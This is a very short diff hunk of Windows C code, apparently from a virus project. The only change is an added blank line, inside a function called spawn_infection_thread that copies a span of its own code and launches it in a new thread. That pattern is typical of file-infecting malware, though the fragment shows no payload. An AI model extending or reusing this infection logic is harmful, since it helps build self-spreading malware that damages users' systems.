@@ -4,6 +4,7 @@ static DWORD WINAPI run(LPVOID param);
 
 void spawn_infection_thread(void) {
     data_t data;
+
     if (init_data(&data, (void*)code_begin, (void*)code_end, (void*)spawn_infection_thread) == 0) {
         HANDLE hThread = data.functions.createThread(
             NULL,
